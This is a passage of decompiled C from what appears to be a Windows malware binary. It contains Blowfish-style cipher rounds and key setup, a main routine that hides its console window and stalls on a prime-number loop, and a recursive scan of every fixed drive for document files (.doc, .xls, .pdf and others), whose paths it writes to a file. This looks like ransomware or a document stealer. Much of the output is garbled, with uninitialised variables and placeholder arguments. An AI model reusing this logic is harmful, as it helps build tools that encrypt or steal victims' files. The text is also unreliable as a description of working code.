    int32_t v64 = *(int32_t *)(a1 + 40); // 0x4068f9
    uint32_t v65 = (v61 + *(int32_t *)((v60 / 0x4000 & 1020) + v7) ^ v62) + v63 ^ v55 ^ v64; // 0x4068fc
    int32_t v66 = *(int32_t *)(4 * v65 / 0x1000000 + v9); // 0x406915
    int32_t v67 = *(int32_t *)((v65 / 64 & 1020) + v12); // 0x406923
    int32_t v68 = *(int32_t *)((4 * v65 & 1020) + v14); // 0x40692d
    int32_t v69 = *(int32_t *)(a1 + 44); // 0x406936
    uint32_t v70 = (v66 + *(int32_t *)((v65 / 0x4000 & 1020) + v7) ^ v67) + v68 ^ v60 ^ v69; // 0x406939
    int32_t v71 = *(int32_t *)(4 * v70 / 0x1000000 + v9); // 0x406952
    int32_t v72 = *(int32_t *)((v70 / 64 & 1020) + v12); // 0x406960
    int32_t v73 = *(int32_t *)((4 * v70 & 1020) + v14); // 0x40696a
    int32_t v74 = *(int32_t *)(a1 + 48); // 0x406973
    uint32_t v75 = (v71 + *(int32_t *)((v70 / 0x4000 & 1020) + v7) ^ v72) + v73 ^ v65 ^ v74; // 0x406976
    int32_t v76 = *(int32_t *)(4 * v75 / 0x1000000 + v9); // 0x40698f
    int32_t v77 = *(int32_t *)((v75 / 64 & 1020) + v12); // 0x40699d
    int32_t v78 = *(int32_t *)((4 * v75 & 1020) + v14); // 0x4069a7
    int32_t v79 = *(int32_t *)(a1 + 52); // 0x4069b0
    uint32_t v80 = (v76 + *(int32_t *)((v75 / 0x4000 & 1020) + v7) ^ v77) + v78 ^ v70 ^ v79; // 0x4069b3
    int32_t v81 = *(int32_t *)(4 * v80 / 0x1000000 + v9); // 0x4069cc
    int32_t v82 = *(int32_t *)((v80 / 64 & 1020) + v12); // 0x4069da
    int32_t v83 = *(int32_t *)((4 * v80 & 1020) + v14); // 0x4069e4
    int32_t v84 = *(int32_t *)(a1 + 56); // 0x4069ed
    uint32_t v85 = (v81 + *(int32_t *)((v80 / 0x4000 & 1020) + v7) ^ v82) + v83 ^ v75 ^ v84; // 0x4069f0
    int32_t v86 = *(int32_t *)((v85 / 0x4000 & 1020) + v7); // 0x406a05
    int32_t v87 = *(int32_t *)(4 * v85 / 0x1000000 + v9); // 0x406a0c
    int32_t v88 = *(int32_t *)(a1 + 60); // 0x406a24
    int32_t v89 = *(int32_t *)((4 * v85 & 1020) + v14); // 0x406a27
    uint32_t v90 = v88 ^ v80 ^ v89 + (v87 + v86 ^ *(int32_t *)((v85 / 64 & 1020) + v12)); // 0x406a33
    int32_t v91 = *(int32_t *)((v90 / 0x4000 & 1020) + v7); // 0x406a45
    int32_t v92 = *(int32_t *)(4 * v90 / 0x1000000 + v9); // 0x406a4c
    int32_t v93 = *(int32_t *)((v90 / 64 & 1020) + v12); // 0x406a5a
    uint32_t v94 = *(int32_t *)(a1 + 68) ^ v90; // 0x406a64
    int32_t v95 = *(int32_t *)(a1 + 64); // 0x406a70
    uint32_t v96 = v95 ^ v85 ^ *(int32_t *)((4 * v90 & 1020) + v14) + (v92 + v91 ^ v93); // 0x406a73
    int32_t v97; // 0x406650
    *(char *)v97 = (char)(v94 / 0x1000000);
    *(char *)(v97 + 1) = (char)(v94 / 0x10000);
    *(char *)(v97 + 2) = (char)(v94 / 256);
    *(char *)(v97 + 4) = (char)(v96 / 0x1000000);
    *(char *)(v97 + 5) = (char)(v96 / 0x10000);
    uint32_t result = v96 / 256; // 0x406a9e
    *(char *)(v97 + 3) = (char)v94;
    *(char *)(v97 + 6) = (char)result;
    *(char *)(v97 + 7) = (char)v96;
    return result;
}

// Address range: 0x406ab0 - 0x406f10
int32_t function_406ab0(int32_t a1) {
    // 0x406ab0
    int32_t v1; // 0x406ab0
    unsigned char v2 = *(char *)(v1 + 1); // 0x406ac2
    unsigned char v3 = *(char *)(v1 + 2); // 0x406acb
    unsigned char v4 = *(char *)(v1 + 3); // 0x406ad4
    int32_t v5 = *(int32_t *)(a1 + 68); // 0x406add
    uint32_t v6 = (256 * (256 * (256 * v1 & 0xff00 | (int32_t)v2) | (int32_t)v3) | (int32_t)v4) ^ v5; // 0x406add
    int32_t v7 = a1 + 1096; // 0x406af0
    int32_t v8 = *(int32_t *)((v6 / 0x4000 & 1020) + v7); // 0x406af0
    int32_t v9 = a1 + 72; // 0x406af7
    int32_t v10 = *(int32_t *)(4 * v6 / 0x1000000 + v9); // 0x406af7
    unsigned char v11 = *(char *)(v1 + 4); // 0x406afd
    int32_t v12 = a1 + 2120; // 0x406b0c
    int32_t v13 = *(int32_t *)((v6 / 64 & 1020) + v12); // 0x406b0c
    int32_t v14 = a1 + 3144; // 0x406b16
    int32_t v15 = *(int32_t *)((4 * v6 & 1020) + v14); // 0x406b16
    unsigned char v16 = *(char *)(v1 + 5); // 0x406b1d
    unsigned char v17 = *(char *)(v1 + 6); // 0x406b23
    unsigned char v18 = *(char *)(v1 + 7); // 0x406b2c
    int32_t v19 = *(int32_t *)(a1 + 64); // 0x406b37
    uint32_t v20 = v19 ^ (v13 ^ v10 + v8) + v15 ^ (256 * (256 * (256 * (int32_t)v11 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18); // 0x406b37
    int32_t v21 = *(int32_t *)(4 * v20 / 0x1000000 + v9); // 0x406b51
    int32_t v22 = *(int32_t *)((v20 / 64 & 1020) + v12); // 0x406b5f
    int32_t v23 = *(int32_t *)((4 * v20 & 1020) + v14); // 0x406b69
    int32_t v24 = *(int32_t *)(a1 + 60); // 0x406b72
    uint32_t v25 = (v21 + *(int32_t *)((v20 / 0x4000 & 1020) + v7) ^ v22) + v23 ^ v6 ^ v24; // 0x406b75
    int32_t v26 = *(int32_t *)(4 * v25 / 0x1000000 + v9); // 0x406b8e
    int32_t v27 = *(int32_t *)((v25 / 64 & 1020) + v12); // 0x406b9c
    int32_t v28 = *(int32_t *)((4 * v25 & 1020) + v14); // 0x406ba6
    int32_t v29 = *(int32_t *)(a1 + 56); // 0x406baf
    uint32_t v30 = (v26 + *(int32_t *)((v25 / 0x4000 & 1020) + v7) ^ v27) + v28 ^ v20 ^ v29; // 0x406bb2
    int32_t v31 = *(int32_t *)(4 * v30 / 0x1000000 + v9); // 0x406bcb
    int32_t v32 = *(int32_t *)((v30 / 64 & 1020) + v12); // 0x406bd9
    int32_t v33 = *(int32_t *)((4 * v30 & 1020) + v14); // 0x406be3
    int32_t v34 = *(int32_t *)(a1 + 52); // 0x406bec
    uint32_t v35 = (v31 + *(int32_t *)((v30 / 0x4000 & 1020) + v7) ^ v32) + v33 ^ v25 ^ v34; // 0x406bef
    int32_t v36 = *(int32_t *)(4 * v35 / 0x1000000 + v9); // 0x406c08
    int32_t v37 = *(int32_t *)((v35 / 64 & 1020) + v12); // 0x406c16
    int32_t v38 = *(int32_t *)((4 * v35 & 1020) + v14); // 0x406c20
    int32_t v39 = *(int32_t *)(a1 + 48); // 0x406c29
    uint32_t v40 = (v36 + *(int32_t *)((v35 / 0x4000 & 1020) + v7) ^ v37) + v38 ^ v30 ^ v39; // 0x406c2c
    int32_t v41 = *(int32_t *)(4 * v40 / 0x1000000 + v9); // 0x406c45
    int32_t v42 = *(int32_t *)((v40 / 64 & 1020) + v12); // 0x406c53
    int32_t v43 = *(int32_t *)((4 * v40 & 1020) + v14); // 0x406c5d
    int32_t v44 = *(int32_t *)(a1 + 44); // 0x406c66
    uint32_t v45 = (v41 + *(int32_t *)((v40 / 0x4000 & 1020) + v7) ^ v42) + v43 ^ v35 ^ v44; // 0x406c69
    int32_t v46 = *(int32_t *)(4 * v45 / 0x1000000 + v9); // 0x406c82
    int32_t v47 = *(int32_t *)((v45 / 64 & 1020) + v12); // 0x406c90
    int32_t v48 = *(int32_t *)((4 * v45 & 1020) + v14); // 0x406c9a
    int32_t v49 = *(int32_t *)(a1 + 40); // 0x406ca3
    uint32_t v50 = (v46 + *(int32_t *)((v45 / 0x4000 & 1020) + v7) ^ v47) + v48 ^ v40 ^ v49; // 0x406ca6
    int32_t v51 = *(int32_t *)(4 * v50 / 0x1000000 + v9); // 0x406cbf
    int32_t v52 = *(int32_t *)((v50 / 64 & 1020) + v12); // 0x406ccd
    int32_t v53 = *(int32_t *)((4 * v50 & 1020) + v14); // 0x406cd7
    int32_t v54 = *(int32_t *)(a1 + 36); // 0x406ce0
    uint32_t v55 = (v51 + *(int32_t *)((v50 / 0x4000 & 1020) + v7) ^ v52) + v53 ^ v45 ^ v54; // 0x406ce3
    int32_t v56 = *(int32_t *)(4 * v55 / 0x1000000 + v9); // 0x406cfc
    int32_t v57 = *(int32_t *)((v55 / 64 & 1020) + v12); // 0x406d0a
    int32_t v58 = *(int32_t *)((4 * v55 & 1020) + v14); // 0x406d14
    int32_t v59 = *(int32_t *)(a1 + 32); // 0x406d1d
    uint32_t v60 = (v56 + *(int32_t *)((v55 / 0x4000 & 1020) + v7) ^ v57) + v58 ^ v50 ^ v59; // 0x406d20
    int32_t v61 = *(int32_t *)(4 * v60 / 0x1000000 + v9); // 0x406d39
    int32_t v62 = *(int32_t *)((v60 / 64 & 1020) + v12); // 0x406d47
    int32_t v63 = *(int32_t *)((4 * v60 & 1020) + v14); // 0x406d51
    int32_t v64 = *(int32_t *)(a1 + 28); // 0x406d5a
    uint32_t v65 = (v61 + *(int32_t *)((v60 / 0x4000 & 1020) + v7) ^ v62) + v63 ^ v55 ^ v64; // 0x406d5d
    int32_t v66 = *(int32_t *)(4 * v65 / 0x1000000 + v9); // 0x406d76
    int32_t v67 = *(int32_t *)((v65 / 64 & 1020) + v12); // 0x406d84
    int32_t v68 = *(int32_t *)((4 * v65 & 1020) + v14); // 0x406d8e
    int32_t v69 = *(int32_t *)(a1 + 24); // 0x406d97
    uint32_t v70 = (v66 + *(int32_t *)((v65 / 0x4000 & 1020) + v7) ^ v67) + v68 ^ v60 ^ v69; // 0x406d9a
    int32_t v71 = *(int32_t *)(4 * v70 / 0x1000000 + v9); // 0x406db3
    int32_t v72 = *(int32_t *)((v70 / 64 & 1020) + v12); // 0x406dc1
    int32_t v73 = *(int32_t *)((4 * v70 & 1020) + v14); // 0x406dcb
    int32_t v74 = *(int32_t *)(a1 + 20); // 0x406dd4
    uint32_t v75 = (v71 + *(int32_t *)((v70 / 0x4000 & 1020) + v7) ^ v72) + v73 ^ v65 ^ v74; // 0x406dd7
    int32_t v76 = *(int32_t *)(4 * v75 / 0x1000000 + v9); // 0x406df0
    int32_t v77 = *(int32_t *)((v75 / 64 & 1020) + v12); // 0x406dfe
    int32_t v78 = *(int32_t *)((4 * v75 & 1020) + v14); // 0x406e08
    int32_t v79 = *(int32_t *)(a1 + 16); // 0x406e11
    uint32_t v80 = (v76 + *(int32_t *)((v75 / 0x4000 & 1020) + v7) ^ v77) + v78 ^ v70 ^ v79; // 0x406e14
    int32_t v81 = *(int32_t *)(4 * v80 / 0x1000000 + v9); // 0x406e2d
    int32_t v82 = *(int32_t *)((v80 / 64 & 1020) + v12); // 0x406e3b
    int32_t v83 = *(int32_t *)((4 * v80 & 1020) + v14); // 0x406e45
    int32_t v84 = *(int32_t *)(a1 + 12); // 0x406e4e
    uint32_t v85 = (v81 + *(int32_t *)((v80 / 0x4000 & 1020) + v7) ^ v82) + v83 ^ v75 ^ v84; // 0x406e51
    int32_t v86 = *(int32_t *)((v85 / 0x4000 & 1020) + v7); // 0x406e66
    int32_t v87 = *(int32_t *)(4 * v85 / 0x1000000 + v9); // 0x406e6d
    int32_t v88 = *(int32_t *)(a1 + 8); // 0x406e85
    int32_t v89 = *(int32_t *)((4 * v85 & 1020) + v14); // 0x406e88
    uint32_t v90 = v88 ^ v80 ^ v89 + (v87 + v86 ^ *(int32_t *)((v85 / 64 & 1020) + v12)); // 0x406e94
    int32_t v91 = *(int32_t *)((v90 / 0x4000 & 1020) + v7); // 0x406ea6
    int32_t v92 = *(int32_t *)(4 * v90 / 0x1000000 + v9); // 0x406ead
    int32_t v93 = *(int32_t *)((v90 / 64 & 1020) + v12); // 0x406ebb
    uint32_t v94 = *(int32_t *)a1 ^ v90; // 0x406ec5
    int32_t v95 = *(int32_t *)(a1 + 4); // 0x406ed0
    uint32_t v96 = v95 ^ v85 ^ *(int32_t *)((4 * v90 & 1020) + v14) + (v92 + v91 ^ v93); // 0x406ed3
    int32_t v97; // 0x406ab0
    *(char *)v97 = (char)(v94 / 0x1000000);
    *(char *)(v97 + 1) = (char)(v94 / 0x10000);
    *(char *)(v97 + 2) = (char)(v94 / 256);
    *(char *)(v97 + 4) = (char)(v96 / 0x1000000);
    *(char *)(v97 + 5) = (char)(v96 / 0x10000);
    uint32_t result = v96 / 256; // 0x406efe
    *(char *)(v97 + 3) = (char)v94;
    *(char *)(v97 + 6) = (char)result;
    *(char *)(v97 + 7) = (char)v96;
    return result;
}

// Address range: 0x406f10 - 0x4070c3
int32_t function_406f10(void) {
    // 0x406f10
    int32_t v1; // 0x406f10
    __asm_movdqu_10(*(int128_t *)&v1, __asm_movdqu(0x370734413198a2e85a308d3243f6a88));
    int32_t v2; // 0x406f10
    __asm_movdqu_10(*(int128_t *)(v2 + 16), __asm_movdqu(g3));
    __asm_movdqu_10(*(int128_t *)(v2 + 32), __asm_movdqu(g4));
    __asm_movdqu_10(*(int128_t *)(v2 + 48), __asm_movdqu(g5));
    __asm_movq_9(*(int64_t *)(v2 + 64), __asm_movq(-0x768604e46de92a27));
    _memcpy2();
    int32_t v3 = 0; // 0x406f92
    int32_t v4 = 2; // 0x406f92
    int32_t v5 = v4 - 2; // 0x406f97
    int32_t v6 = v4 - 1; // 0x406f9d
    int32_t v7; // 0x406f10
    unsigned char v8 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v5 >> 31) | (int64_t)v5) % 24)); // 0x406fa0
    unsigned char v9 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 24)); // 0x406fab
    unsigned char v10 = *(char *)(v4 % 24 + v7); // 0x406fba
    unsigned char v11 = *(char *)((v4 | 1) % 24 + v7); // 0x406fcd
    int32_t * v12 = (int32_t *)(4 * v3 + v2); // 0x406fd6
    int32_t v13 = *v12; // 0x406fd6
    *v12 = (256 * (256 * (256 * (int32_t)v8 | (int32_t)v9) | (int32_t)v10) | (int32_t)v11) ^ v13;
    v3++;
    v4 += 4;
    while (v3 != 18) {
        // 0x406f97
        v5 = v4 - 2;
        v6 = v4 - 1;
        v8 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v5 >> 31) | (int64_t)v5) % 24));
        v9 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 24));
        v10 = *(char *)(v4 % 24 + v7);
        v11 = *(char *)((v4 | 1) % 24 + v7);
        v12 = (int32_t *)(4 * v3 + v2);
        v13 = *v12;
        *v12 = (256 * (256 * (256 * (int32_t)v8 | (int32_t)v9) | (int32_t)v10) | (int32_t)v11) ^ v13;
        v3++;
        v4 += 4;
    }
    // 0x406fe7
    unsigned char v14; // 0x406f10
    unsigned char v15; // 0x406f10
    int32_t v16 = 256 * (int32_t)v15 | (int32_t)v14;
    unsigned char v17; // 0x406f10
    unsigned char v18; // 0x406f10
    int32_t v19 = 256 * (0x10000 * (int32_t)v18 | (int32_t)v17);
    for (int32_t i = 0; i < 18; i += 2) {
        // 0x406ff0
        function_406650((int32_t)&g32);
        int32_t v20 = 4 * i + v2;
        *(int32_t *)v20 = v16;
        *(int32_t *)(v20 + 4) = v19;
    }
    int32_t v21 = v2 + 76; // 0x40704e
    for (int32_t i = 4; i > 0; i--) {
        int32_t v22 = 128; // 0x40705a
        function_406650((int32_t)&g32);
        *(int32_t *)(v21 - 4) = v16;
        *(int32_t *)v21 = v19;
        v21 += 8;
        v22--;
        int32_t v23 = v21; // 0x4070b5
        while (v22 != 0) {
            // 0x407060
            function_406650((int32_t)&g32);
            *(int32_t *)(v23 - 4) = v16;
            *(int32_t *)v23 = v19;
            v21 = v23 + 8;
            v22--;
            v23 = v21;
        }
    }
    // 0x4070bc
    return 0;
}

// Address range: 0x4070d0 - 0x40711e
int32_t function_4070d0(void) {
    // 0x4070d0
    int32_t v1; // bp-12, 0x4070d0
    int32_t v2 = &v1; // 0x4070d7
    int32_t v3 = 3;
    int32_t v4 = 2;
    int32_t v5 = v3 - 1; // 0x4070e5
    int32_t v6; // 0x4070d0
    int32_t v7 = v6; // 0x4070ea
    int32_t v8 = 2; // 0x4070ea
    int32_t v9; // 0x4070d0
    int64_t v10; // 0x4070f3
    int64_t v11; // 0x4070f3
    int32_t v12; // 0x4070f9
    if (v5 >= 2) {
        // 0x4070f0
        v10 = 0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3;
        v9 = 2;
        v11 = v9;
        v8 = v9;
        while ((int32_t)(v10 % v11) != 0) {
            // 0x4070f9
            v12 = v9 + 1;
            v8 = v12;
            if (v12 > v5) {
                // break -> 0x4070fe
                break;
            }
            v9 = v12;
            v11 = v9;
            v8 = v9;
        }
        // 0x4070fe
        v7 = v10 / v11;
    }
    int32_t v13 = v7; // 0x407100
    int32_t v14 = v4; // 0x407100
    if (v8 == v3) {
        // 0x407102
        *(int32_t *)(v2 - 4) = v3;
        *(int32_t *)(v2 - 8) = (int32_t)"%d\n";
        v13 = _printf((char *)&g32);
        v14 = v4 + 1;
    }
    int32_t result = v13;
    int32_t v15 = v3 + 1; // 0x407118
    while (v14 < 0x13881) {
        // 0x4070e0
        v3 = v15;
        v4 = v14;
        v5 = v3 - 1;
        v7 = result;
        int32_t v16 = 2; // 0x4070ea
        if (v5 >= 2) {
            // 0x4070f0
            v10 = 0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3;
            v9 = 2;
            v11 = v9;
            v8 = v9;
            while ((int32_t)(v10 % v11) != 0) {
                // 0x4070f9
                v12 = v9 + 1;
                v8 = v12;
                if (v12 > v5) {
                    // break -> 0x4070fe
                    break;
                }
                v9 = v12;
                v11 = v9;
                v8 = v9;
            }
            // 0x4070fe
            v7 = v10 / v11;
            v16 = v8;
        }
        // 0x4070fe
        v13 = v7;
        v14 = v4;
        if (v16 == v3) {
            // 0x407102
            *(int32_t *)(v2 - 4) = v3;
            *(int32_t *)(v2 - 8) = (int32_t)"%d\n";
            v13 = _printf((char *)&g32);
            v14 = v4 + 1;
        }
        // 0x407111
        result = v13;
        v15 = v3 + 1;
    }
    // 0x40711a
    return result;
}

// Address range: 0x407120 - 0x40713c
int main(int argc, char ** argv) {
    // 0x407120
    ShowWindow(GetConsoleWindow(), (int32_t)&g32);
    function_4070d0();
    function_40ab30((int32_t)&g32);
    return 0;
}

// Address range: 0x407140 - 0x40719e
int32_t function_407140(void) {
    // 0x407140
    int32_t v1; // 0x407140
    int32_t v2 = *(int32_t *)(v1 + 120 + *(int32_t *)(v1 + 60)) + v1; // 0x407155
    int32_t v3 = *(int32_t *)(v2 + 32); // 0x40715a
    int32_t v4 = *(int32_t *)(v2 + 24) - 1; // 0x407162
    int32_t v5 = -1; // 0x407163
    if (v4 >= 0) {
        // 0x407165
        int32_t v6; // bp-24, 0x407140
        int32_t v7 = &v6; // 0x40716b
        int32_t v8 = v4; // 0x407176
        v7 -= 8;
        *(int32_t *)v7 = *(int32_t *)(v3 + v1 + 4 * v8) + v1;
        int32_t v9 = lstrcmpA((char *)&g32, (char *)&g32); // 0x40716c
        v5 = v8;
        while (v9 != 0) {
            // 0x407176
            v8--;
            v5 = -1;
            if (v8 < 0) {
                // break -> 0x40717f
                break;
            }
            v7 -= 8;
            *(int32_t *)v7 = *(int32_t *)(v3 + v1 + 4 * v8) + v1;
            v9 = lstrcmpA((char *)&g32, (char *)&g32);
            v5 = v8;
        }
    }
    uint16_t v10 = *(int16_t *)(2 * v5 + v1 + *(int32_t *)(v2 + 36)); // 0x407188
    int32_t v11 = *(int32_t *)(*(int32_t *)(v2 + 28) + v1 + 4 * (int32_t)v10); // 0x407192
    return v11 + v1;
}

// Address range: 0x409000 - 0x40927a
int32_t function_409000(void) {
    // 0x409000
    __chkstk();
    int32_t lpOut; // 0x409000
    wsprintfW((int16_t *)lpOut, (int16_t *)&g32);
    int32_t lpFileName; // bp-4108, 0x409000
    int16_t * v1 = (int16_t *)&lpFileName; // bp-24, 0x409047
    char lpFindFileData; // bp-8796, 0x409000
    int32_t * v2 = FindFirstFileW((int16_t *)&lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x409048
    if (v2 == (int32_t *)-1) {
        // 0x409059
        return _40___security_check_cookie_40_4();
    }
    // 0x409080
    int32_t v3; // bp-4, 0x409000
    int32_t v4 = &v3; // 0x409001
    int32_t v5 = (int32_t)v2; // 0x409048
    int32_t v6; // bp-8752, 0x409000
    int32_t v7 = &v6; // 0x40908b
    int32_t v8 = &lpFileName;
    int32_t v9 = v4 - 0x2234;
    int32_t v10; // bp-8204, 0x409000
    int32_t v11 = &v10;
    int32_t v12 = (int32_t)&v1; // 0x409247
    int32_t v13; // 0x409000
    int32_t v14; // 0x409000
    while (true) {
      lab_0x409080:;
        int32_t v15 = v12;
        *(int32_t *)(v15 - 4) = (int32_t)&g2;
        int32_t v16 = v15 - 8; // 0x40908b
        *(int32_t *)v16 = v7;
        int32_t v17 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x40908c
        v14 = v16;
        if (v17 == 0) {
            goto lab_0x409240;
        } else {
            // 0x409096
            *(int32_t *)(v15 - 12) = (int32_t)L"..";
            int32_t v18 = v15 - 16; // 0x4090a1
            *(int32_t *)v18 = v7;
            int32_t v19 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x4090a2
            v14 = v18;
            if (v19 == 0) {
                goto lab_0x409240;
            } else {
                int32_t * v20 = (int32_t *)(v15 - 20); // 0x4090b2
                *v20 = v7;
                int32_t v21 = v15 - 28; // 0x4090bf
                int32_t * v22 = (int32_t *)v21; // 0x4090bf
                *v22 = (int32_t)L"%s\\%s";
                int32_t * v23 = (int32_t *)(v15 - 32); // 0x4090c4
                *v23 = v8;
                wsprintfW((int16_t *)&g32, (int16_t *)&g32);
                if ((lpFindFileData & 16) == 0) {
                    // 0x4090e3
                    *v20 = (int32_t)L".txt";
                    *(int32_t *)(v15 - 24) = v7;
                    *v22 = 2 * lstrlenW((int16_t *)&g32) + v9;
                    int32_t v24 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x4090f9
                    v13 = v21;
                    if (v24 == 0) {
                        goto lab_0x4091ef;
                    } else {
                        // 0x409103
                        *v23 = (int32_t)L".doc";
                        *(int32_t *)(v15 - 36) = v7;
                        int32_t v25 = lstrlenW((int16_t *)&g32); // 0x40910f
                        int32_t v26 = v15 - 40; // 0x409118
                        *(int32_t *)v26 = 2 * v25 + v9;
                        int32_t v27 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x409119
                        v13 = v26;
                        if (v27 == 0) {
                            goto lab_0x4091ef;
                        } else {
                            // 0x409123
                            *(int32_t *)(v15 - 44) = (int32_t)L".xls";
                            *(int32_t *)(v15 - 48) = v7;
                            int32_t v28 = lstrlenW((int16_t *)&g32); // 0x40912f
                            int32_t v29 = v15 - 52; // 0x409138
                            *(int32_t *)v29 = 2 * v28 + v9;
                            int32_t v30 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x409139
                            v13 = v29;
                            if (v30 == 0) {
                                goto lab_0x4091ef;
                            } else {
                                // 0x409143
                                *(int32_t *)(v15 - 56) = (int32_t)L".xlsx";
                                *(int32_t *)(v15 - 60) = v7;
                                int32_t v31 = lstrlenW((int16_t *)&g32); // 0x40914f
                                int32_t v32 = v15 - 64; // 0x409158
                                *(int32_t *)v32 = 2 * v31 + v9;
                                int32_t v33 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x409159
                                v13 = v32;
                                if (v33 == 0) {
                                    goto lab_0x4091ef;
                                } else {
                                    // 0x409163
                                    *(int32_t *)(v15 - 68) = (int32_t)L".docx";
                                    *(int32_t *)(v15 - 72) = v7;
                                    int32_t v34 = lstrlenW((int16_t *)&g32); // 0x40916f
                                    int32_t v35 = v15 - 76; // 0x409178
                                    *(int32_t *)v35 = v4 - 0x2236 + 2 * v34;
                                    int32_t v36 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x409179
                                    v13 = v35;
                                    if (v36 == 0) {
                                        goto lab_0x4091ef;
                                    } else {
                                        // 0x40917f
                                        *(int32_t *)(v15 - 80) = (int32_t)L".xls";
                                        *(int32_t *)(v15 - 84) = v7;
                                        int32_t v37 = lstrlenW((int16_t *)&g32); // 0x40918b
                                        int32_t v38 = v15 - 88; // 0x409194
                                        *(int32_t *)v38 = 2 * v37 + v9;
                                        int32_t v39 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x409195
                                        v13 = v38;
                                        if (v39 == 0) {
                                            goto lab_0x4091ef;
                                        } else {
                                            // 0x40919b
                                            *(int32_t *)(v15 - 92) = (int32_t)L".ppt";
                                            *(int32_t *)(v15 - 96) = v7;
                                            int32_t v40 = lstrlenW((int16_t *)&g32); // 0x4091a7
                                            int32_t v41 = v15 - 100; // 0x4091b0
                                            *(int32_t *)v41 = 2 * v40 + v9;
                                            int32_t v42 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x4091b1
                                            v13 = v41;
                                            if (v42 == 0) {
                                                goto lab_0x4091ef;
                                            } else {
                                                // 0x4091b7
                                                *(int32_t *)(v15 - 104) = (int32_t)L".pptx";
                                                *(int32_t *)(v15 - 108) = v7;
                                                int32_t v43 = lstrlenW((int16_t *)&g32); // 0x4091c3
                                                int32_t v44 = v15 - 112; // 0x4091cc
                                                *(int32_t *)v44 = 2 * v43 + v9;
                                                int32_t v45 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x4091cd
                                                v13 = v44;
                                                if (v45 == 0) {
                                                    goto lab_0x4091ef;
                                                } else {
                                                    // 0x4091d3
                                                    *(int32_t *)(v15 - 116) = (int32_t)L".pdf";
                                                    *(int32_t *)(v15 - 120) = v7;
                                                    int32_t v46 = lstrlenW((int16_t *)&g32); // 0x4091df
                                                    int32_t v47 = v15 - 124; // 0x4091e8
                                                    *(int32_t *)v47 = 2 * v46 + v9;
                                                    int32_t v48 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x4091e9
                                                    v13 = v47;
                                                    v14 = v47;
                                                    if (v48 != 0) {
                                                        goto lab_0x409240;
                                                    } else {
                                                        goto lab_0x4091ef;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    // 0x4090d3
                    function_409000();
                    v14 = v18;
                    goto lab_0x409240;
                }
            }
        }
    }
  lab_0x40925b:;
    // 0x40925b
    int32_t v49; // 0x409000
    *(int32_t *)(v49 - 12) = v5;
    FindClose(&g32);
    return _40___security_check_cookie_40_4();
  lab_0x409240:
    // 0x409240
    v49 = v14;
    *(int32_t *)(v49 - 4) = (int32_t)&lpFindFileData;
    v12 = v49 - 8;
    *(int32_t *)v12 = v5;
    if (!FindNextFileW(&g32, (struct _WIN32_FIND_DATAW *)&g32)) {
        // break -> 0x40925b
        goto lab_0x40925b;
    }
    goto lab_0x409080;
  lab_0x4091ef:;
    int32_t * v50 = (int32_t *)(v13 - 4); // 0x4091f5
    *v50 = v7;
    int32_t * v51 = (int32_t *)(v13 - 8); // 0x4091f6
    *v51 = (int32_t)"%s\n";
    _printf((char *)&g32);
    int32_t * v52 = (int32_t *)(v13 - 12); // 0x409206
    *v52 = v8;
    int32_t * v53 = (int32_t *)(v13 - 16); // 0x40920d
    *v53 = (int32_t)L" \n%s \r\n";
    int32_t * v54 = (int32_t *)(v13 - 20); // 0x409212
    *v54 = v11;
    wsprintfW((int16_t *)&g32, (int16_t *)&g32);
    *v50 = v11;
    int32_t v55 = lstrlenW((int16_t *)&g32); // 0x40921f
    *v51 = 0;
    int32_t v56; // bp-8808, 0x409000
    *v52 = (int32_t)&v56;
    *v53 = 2 * v55;
    *v54 = v11;
    int32_t v57 = v13 - 24; // 0x409234
    *(int32_t *)v57 = g31;
    WriteFile(&g32, &g32, (int32_t)&g32, &g32, (struct _OVERLAPPED *)&g32);
    v14 = v57;
    goto lab_0x409240;
}

// Address range: 0x409280 - 0x4092f2
int32_t function_409280(void) {
    int32_t v1 = 260; // bp-556, 0x40929c
    int16_t lpBuffer; // bp-540, 0x409280
    GetLogicalDriveStringsW(260, &lpBuffer);
    if (lpBuffer == 0) {
        // 0x4092e2
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = &v1; // 0x4092c0
    int32_t v3 = &lpBuffer; // 0x4092d9
    v2 -= 4;
    *(int32_t *)v2 = v3;
    if (GetDriveTypeW((int16_t *)&g32) == 3) {
        // 0x4092c8
        function_409000();
    }
    int32_t v4 = v3;
    int32_t v5 = v4 + 2; // 0x4092d0
    while (*(int16_t *)v5 != 0) {
        // 0x4092d0
        v4 = v5;
        v5 = v4 + 2;
    }
    // 0x4092d9
    v3 = v4 + 4;
    while (*(int16_t *)v3 != 0) {
        // 0x4092c0
        v2 -= 4;
        *(int32_t *)v2 = v3;
        if (GetDriveTypeW((int16_t *)&g32) == 3) {
            // 0x4092c8
            function_409000();
        }
        // 0x4092d0
        v4 = v3;
        v5 = v4 + 2;
        while (*(int16_t *)v5 != 0) {
            // 0x4092d0
            v4 = v5;
            v5 = v4 + 2;
        }
        // 0x4092d9
        v3 = v4 + 4;
    }
    // 0x4092e2
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409300 - 0x409397
int32_t function_409300(void) {
    int32_t lpBuffer = 0; // bp-276, 0x40931e
    int32_t v1; // bp-275, 0x409300
    _memset(&v1, 0, 259);
    GetTempPathA(260, (char *)&lpBuffer);
